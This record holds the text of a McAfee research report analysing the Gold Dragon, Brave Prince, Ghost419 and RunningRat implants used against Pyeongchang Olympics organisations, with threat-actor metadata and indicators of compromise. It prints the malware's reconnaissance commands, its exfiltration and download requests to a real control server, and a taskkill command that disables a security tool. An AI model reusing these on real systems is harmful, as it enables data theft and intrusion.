{
    "id": "5b036a74-92d9-4891-a5a6-f2338d3f2bfc",
    "created_at": "2022-10-25T16:48:17.381306Z",
    "updated_at": "2025-03-27T02:05:37.762868Z",
    "deleted_at": null,
    "sha1_hash": "43d4c021682681ff6061a74b794744f74ef5bea2",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-02-05T06:50:21Z",
    "file_modification_date": "2018-02-05T06:50:21Z",
    "file_size": 1139945,
    "plain_text": "(https://securingtomorrow.mcafee.com/)\n\n    \n\n# Gold Dragon Widens Olympics Malware Attacks, Gains Permanent Presence on Victims’ Systems\n\n\n#### \n\n\n[By Ryan Sherstobito� (https://securingtomorrow.mcafee.com/author/ryan-sherstobito�/) and Jessica Saavedra-Morales](https://securingtomorrow.mcafee.com/author/ryan-sherstobitoff/)\n\n(https://securingtomorrow.mcafee.com/author/jessica-saavedra-morales/) on Feb 02, 2018\n(https://securingtomorrow.mcafee.com/2018/02/)\n\nMcAfee Advanced Threat Research (ATR) recently released a report (https://securingtomorrow.mcafee.com/mcafee\nlabs/malicious-document-targets-pyeongchang-olympics/) describing a �leless attack targeting organizations involved with\n\nthe Pyeongchang Olympics. The attack used a PowerShell implant that established a channel to the attacker’s server to\ngather basic system-level data. What was not determined at that time was what occurred after the attacker gained access\n\nto the victim’s system.\n\nMcAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data\n\nex�ltration and for targeted access. We have named these implants, which appeared in December 2017, Gold Dragon,\nBrave Prince, Ghost419, and Running Rat, based on phrases in their code.\n\nOn December 24, 2017, our analysts observed the Korean-language implant Gold Dragon. We now believe this implant is\n\nthe second-stage payload in the Olympics attack that ATR discovered January 6, 2018. The PowerShell implant used in the\nOlympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the\nattacker’s server. However, this implant required additional modules to be executed to be a fully capable backdoor. In\n\naddition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task. Gold Dragon has\na much more robust persistence mechanism than the initial PowerShell implant and enables the attacker to do much\n\nmore to the target system. Gold Dragon reappeared the same day that the Olympics campaign began.\n\nThe Gold Dragon malware appears to have expanded capabilities for pro�ling a target’s system and sending the results to\na control server. The PowerShell implant had only basic data-gathering capabilities—such as username, domain, machine\nname, and network con�guration—which are useful only for identifying interesting victims and launching more complex\n\nmalware against them.\n\n### Gold Dragon\n\n\n-----\n\nhardcoded domain www.golddragon.com, which we found throughout the samples.\n\nThis sample acts as a reconnaissance tool and downloader for subsequent payloads of the malware infection and payload\nchain. Apart from downloading and executing binaries from the control server, Gold Dragon generates a key to encrypt\n\ndata that the implant obtains from the system. This URL is not used for control; the encrypted data is sent to the server\nink.inkboom.co.kr, which was used by previous implants as early as May 2017.\n\nGold Dragon contains elements, code, and similar behavior to implants Ghost419 and Brave Prince, which we have tracked\nsince May 2017. A DLL-based implant created on December 21 (the same day the �rst malicious Olympics document\n\nappeared) was downloaded by a Gold Dragon variant created December 24. This variant was created three days before\n\nthe targeted spear phishing email with the second document that was sent to 333 victim organizations. The December 24\nvariant of Gold Dragon used the control server nid-help-pchange.atwebpages.com, which was also used by a Brave Prince\n\nvariant from December 21.\n\nThe �rst variants of Gold Dragon appeared in the wild in South Korea in July 2017. The original Gold Dragon had the �le\n\nname 한글추출.exe, which translates as Hangul Extraction and was seen exclusively in South Korea. Five variants of Gold\n\nDragon compiled December 24 appeared heavily during the targeting of the Olympics organizations.\n\n### Analyzing Gold Dragon\n\nAs part of its initialization, Gold Dragon:\n\nBuilds its imports by dynamically loading multiple APIs from multiple libraries\n\nGains debug privileges (“SeDebugPrivilege”) for its own process to read remote memory residing in other processes\n\nThe malware does not establish persistence for itself but for another component (if it is found) on the system:\n\nThe malware begins by looking for an instance of the Hangul word processor (HWP) running on the system. (HWP is a\nKorean word processor similar to Microsoft Word.)\n\nChecking for HWP.exe in the process list.\n\nIf HWP.exe is found running on the system, the malware �nds the currently open �le in HWP by extracting the �le path\n\nfrom the command-line argument passed to HWP.exe\n\nThis word �le (usually named *.hwp) is copied into the temporary �le path\n\nC:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\2.hwp\n\nhwp is an exact copy of the �le loaded into HWP.exe\n\nThe malware reads the contents of 2.hwp and �nds an “MZ magic marker” in the �le indicated by the string “JOYBERTM”\n\n\n-----\n\nChecking for the MZ marker in the HWP �le.\n\nThis marker indicates the presence of an encrypted MZ marker in the .hwp �le and is decrypted by the malware and\nwritten to the Startup folder for the user:\n\nC:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exe\n\nThis step establishes the persistence of the malware across reboots on the endpoint\n\nOnce the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint\n\nThe malware might perform this activity for a couple of reasons:\n\nEstablish persistence for itself on the endpoint\n\nEstablish persistence of another component of the malware on the endpoint\n\nUpdate itself on endpoint after a separate updater component downloads the update from the control server\n\nThe malware has limited reconnaissance and data-gathering capabilities and is not full-�edged spyware. Any information\n\ngathered from the endpoint is �rst stored in the following �le, encrypted, and sent to the control server:\n\nC:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nThe following information is gathered from the endpoint, stored in the �le 1.hwp, and sent to the control server:\n\nDirectory listing of the user’s Desktop folder using command:\n\ncmd.exe /c dir C:\\DOCUME~1\\<username>\\Desktop\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nDirectory listing of the user’s recently accessed �les using command:\n\ncmd.exe /c dir C:\\DOCUME~1\\<username>\\Recent >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nDirectory listing of the system’s %program�les% folder using command:\n\n\n-----\n\ny p g\n\ncmd.exe /c systeminfo >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nCopies the �le ixe000.bin from:\n\nC:\\Documents and Settings\\<username>\\Application Data\\Microsoft\\Windows\\UserPro�les\\ixe000.bin\n\nTo:\n\nC:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nRegistry key and value information for the current user’s Run key (with information collected):\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nNumber of subkeys\n\n(<KeyIndex>) <KeyName>\n\nNumber of Values under each key including the parent Run key\n\n(<ValueIndex>) <Value_Name> <Value_Content>\n\nRegistry Run key enumeration by Gold Dragon.\n\nAn example of 1.hwp with registry and system information:\n\n\n-----\n\nGold Dragon executes these steps executed in the ex�ltration process:\n\nOnce the malware has gathered the required data from the endpoint, it encrypts the data �le 1.hwp using the password\n\n“www[dot]GoldDragon[dot]com”\nThe encrypted content is written to the data �le 1.hwp.\n\nDuring the ex�ltration process, the malware Base64-encodes the encrypted data and sends it to its control server using\n\nan HTTP POST request to the URL:\n\nhttp://ink[dot]inkboom.co.kr/host/img/jpg/post.php\n\nHTTP data/parameters used in the request include:\n\nContent-Type: multipart/form-data; boundary=—-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64\n\nencoded & encrypted system info>\n\nUser Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)\n\nAccept-Language: en-us\n\nHTTP Version: HTTP/1.0\n\nThe malware can also download and execute additional components served to it by the control server. The mechanism for\n\ndownloading additional components is based on the Computer Name and UserName of the endpoint provided by the\n\nmalware process to the control server in the following HTTP GET request:\n\nGET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?�lename=\n\n<Computer_Name>_<username>&continue=dnsadmin\n\nAfter successfully retrieving the component from the control server, the next-stage payload is copied to the Application\n\nData directory of the current user and executed:\n\nC:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex\n\n(note “ex,” not “exe”)\n\n\n-----\n\nThe capability to download additional components from the control server.\n\n\n-----\n\nproducts:\n\nThe presence of any process with the keywords “v3” and “cleaner.”\n\nChecking for antimalware or cleaner processes.\n\nIf found, these processes are terminated by sending a WM_CLOSE message to their windowing threads.\n\nTerminating an antimalware/cleaner process.\n\n### Brave Prince\n\nBrave Prince is a Korean-language implant that contains similar code and behavior to the Gold Dragon variants, speci�cally\nthe system pro�ling and control server communication mechanism. The malware gathers detailed logs about the victim’s\ncon�guration, contents of the hard drive, registry, scheduled tasks, running processes, and more. Brave Prince was �rst\n\nobserved in the wild December 13, 2017, sending logs to the attacker via South Korea’s Daum email service. Later variants\nposted the data to a web server via an HTTP post command, in the same way that Gold Dragon does.\n\n\n-----\n\nThe embedded domain braveprince.com.\n\nThe Daum variants of Brave Prince gather information from the system and save it to the �le PI_00.dat. This �le is sent as\n\nan attachment to the attacker’s email address. Later variants upload the �le to a web server via an HTTP post command.\nThe type of data this implant gathers from the victim’s system:\n\nDirectories and �les\nNetwork con�guration\n\nAddress resolution protocol cache\nSystemcon�g to gather tasks\n\nBoth variants of Brave Prince can kill a process associated with a tool created by Daum that can block malicious code. This\ntool is exclusive to South Korea.\n\ntaskkill /f /im daumcleaner.exe\n\nThe later variants of Brave Prince include the following hardcoded strings:\n\nc:\\utils\\c2ae_uiproxy.exe\nc:\\users\\sales\\appdata\\local\\temp\\dwrrypm.dl\n\n### Ghost419\n\nGhost419 is a Korean-language implant that �rst appeared in the wild December 18, 2017, with the most recent sample\nappearing two days before the Olympics spear phishing email. The malware can be identi�ed by the hardcoded string and\n\nURL parameter passed to the control server. Ghost419 can be traced to a sample created July 29, 2017, that appears to be\na much earlier version (without the hardcoded identi�er). The July version shares 46% of its code with samples created in\n\nlate December. This early version implant creates a unique mutex value (kjie23948_34238958_KJ238742) that also appears\nin a sample from December, with the exception that one digit has changed. Ghost419 is based on Gold Dragon and Brave\n\nPrince implants and contains shared elements and code, especially for system reconnaissance functions.\n\nHardcoded “Ghost419” in the malware binary.\n\nThe string “WebKitFormBoundarywhpFxMBe19cSjFnG,” part of the upload mechanism, also appears in the Gold Dragon\nvariants of late December 2017.\n\n\n-----\n\nGold Dragon sample.\n\nGhost419 sample.\n\nNumerous other similarities are present in addition to system reconnaissance methods; the communication mechanism\nuses the same user agent string as Gold Dragon.\n\nGold Dragon user agent string.\n\nGhost419 user agent string.\n\n### RunningRat\n\nRunningRat is a remote access Trojan (RAT) that operates with two DLLs. It gets its name from a hardcoded string\n\nembedded in the malware. Upon being dropped onto a system, the �rst DLL executes. This DLL serves three main\nfunctions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence. The malware drops\nthe Windows batch �le dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program. The batch �le\n\nthen attempts to remove itself.\n\nThe �rst DLL unpacks a resource �le attached to the DLL using a zlib decompression algorithm. The authors of the\nmalware left the debugging strings in the binary, making the algorithm easy to identify. The second DLL is decompressed\nin memory and never touches the user’s �le system; this �le is the main RAT that executes. Finally, the �rst DLL adds the\n\nregistry key “SysRat,” at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup.\n\n\n-----\n\nAfter the second DLL is loaded into memory, the �rst DLL overwrites the IP address for the control server, e�ectively\nchanging the address the malware will communicate with. This address is hardcoded in the second DLL as 200.200.200.13\n\nand is modi�ed by the �rst DLL to 223.194.70.136.\n\nThis type of behavior may indicate this code is being reused or is part of a malware kit.\n\nThe �rst DLL uses one common antidebugging technique by checking for SeDebugPrivilege.\n\nOnce the second DLL is executed, it gathers information about the victim system’s setup, such as operating system\nversion and driver and processor information\n\n\n-----\n\nThe malware initiates its main function of capturing user keystrokes and sending them to the control server using\n\nstandard Windows networking APIs.\n\nFrom our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive\nfunctionality. Code is included to copy the clipboard, delete �les, compress �les, clear event logs, shut down the machine,\nand much more. However, our current analysis shows no way for such code to be executed.\n\n\n-----\n\nMcAfee ATR analysts will continue to research RunningRat to determine if this extra code is used or is possibly left over\nfrom a larger RAT toolkit.\n\nThe second DLL employs a few additional antidebugging techniques. One is the use of a custom exception handler and\ncode paths that are designed to generate exceptions.\n\n\n-----\n\nThe �nal antidebugging technique involves GetTickCount performance counters, which are placed within the main\nsections of code to detect any delay a debugger adds during runtime.\n\nConclusion\n\nThe PowerShell script �rst discovered by McAfee ATR was delivered via a spear phishing campaign that used image\nstenography techniques to hide the �rst-stage implant. (For more on steganography, see the McAfee Labs Threats Report,\nJune 2017, (https://www.mcafee.com/us/resources/reports/rp-quarterly-threats-jun-2017.pdf) page 33.)\n\nThe implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant\nis executed. The implants are delivered as a second stage once the attacker gains an initial foothold using �leless malware.\nSome of the implants will maintain their persistence only if Hangul Word, which is speci�c to South Korea, is running.\n\nWith the discovery of these implants, we now have a better understanding of the scope of this operation. Gold Dragon,\nBrave Prince, Ghost419, and RunningRat demonstrate a much wider campaign than previously known. The persistent data\nex�ltration we see from these implants could give the attacker a potential advantage during the Olympics.\n\nWe thank Charles Crawford and Asheer Malhotra for their support of this analysis.\n\n### Indicators of Compromise\n\nIPs\n\n194.70.136\n\nDomains\n\n000webhostapp.com\n000webhostapp.com\n000webhostapp.com\n\nnid-help-pchange.atwebpages.com\ninkboom.co.kr\nbyethost7.com\n\nHashes\n\nfef671c13039df24e1606d5fdc65c92fbc1578d9\n06948ab527ae415f32ed4b0f0d70be4a86b364a5\n\n\n-----\n\nc2f01355880cd9dfeef75c�189f4a8af421e0d3\n615447f458463dc77f7ae3b0a4ad20ca2303027a\nbf21667e4b48b8857020ba455531c9c4f2560740\nbc6cb78e20cb20285149d55563f6fdcf4aaafa58\n465d48ae849bbd6505263f3323e818ccb501ba88\n\na9eb9a1734bb84bbc60df38d4a1e02a870962857\n539acd9145befd7e670fe826c248766f46f0d041\nd63c7d7305a8b2184�f3b0941e596f09287aa66\n35e5310b6183469f4995b7cd4f795da8459087a4\n11a38a9d23193d9582d02ab0eae767c3933066ec\n\ne68f43ecb03330�0420047b61933583b4144585\n83706ddaa5ea5ee2c�f54b7c809458a39163a7a\n3a0c617d17e7f819775e48f7edefe9af84a1446b\n761b0690cd86fb472738b6dc32661ace5cf18893\n\n7e74f034d8aa4570bd1b7dcfcdfaa52c9a139361\n5e1326dd7122e2e2aed04ca4de180d16686853a7\n6e13875449beb00884e07a38d0dd2a73afe38283\n4f58e6a7a04be2b2ecbcdcbae6f281778fdbd9f9\n389db34c3a37fd288e92463302629aa48be06e35\n\n71f337dc65459027f4ab26198270368f68d7ae77\n5a7fdfa88addb88680c2f0d5f7095220b4bb�c1\n\n[ Previous Article (https://securingtomorrow.mcafee.com/consumer/family-safety/kids-problem-heres/)](https://securingtomorrow.mcafee.com/consumer/family-safety/kids-problem-heres/)\n\n[Next Article  (https://securingtomorrow.mcafee.com/consumer/consumer-threat-notices/gdpr-basics/)](https://securingtomorrow.mcafee.com/consumer/consumer-threat-notices/gdpr-basics/)\n\n[ Categories: McAfee Labs (https://securingtomorrow.mcafee.com/category/mcafee-labs/)](https://securingtomorrow.mcafee.com/category/mcafee-labs/)\n[ Tags:  advanced persistent threats (https://securingtomorrow.mcafee.com/tag/advanced-persistent-threats/),](https://securingtomorrow.mcafee.com/tag/advanced-persistent-threats/)\n[cybersecurity (https://securingtomorrow.mcafee.com/tag/cybersecurity/), endpoint protection](https://securingtomorrow.mcafee.com/tag/cybersecurity/)\n(https://securingtomorrow.mcafee.com/tag/endpoint-protection/), malware\n\n(https://securingtomorrow.mcafee.com/tag/malware/)\n\n## Leave a reply\n\nFacebook Comments (0) Comments (0) G+ Comments\n\n\n**0 Comments** Sort by\n\nAdd a comment...\n\n[Facebook Comments Plugin](https://developers.facebook.com/products/social-plugins/comments/?utm_campaign=social_plugins&utm_medium=offsite_pages&utm_source=comments_plugin)\n\n\n**Oldest**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.02.02.gold-dragon-widens-olympics-malware/Gold_Dragon_Olympics.pdf"
    ],
    "report_names": [
        "Gold_Dragon_Olympics"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716497,
    "ts_updated_at": 1743041137,
    "ts_creation_date": 1517813421,
    "ts_modification_date": 1517813421,
    "files": {
        "pdf": "https://archive.orkl.eu/43d4c021682681ff6061a74b794744f74ef5bea2.pdf",
        "text": "https://archive.orkl.eu/43d4c021682681ff6061a74b794744f74ef5bea2.txt",
        "img": "https://archive.orkl.eu/43d4c021682681ff6061a74b794744f74ef5bea2.jpg"
    }
}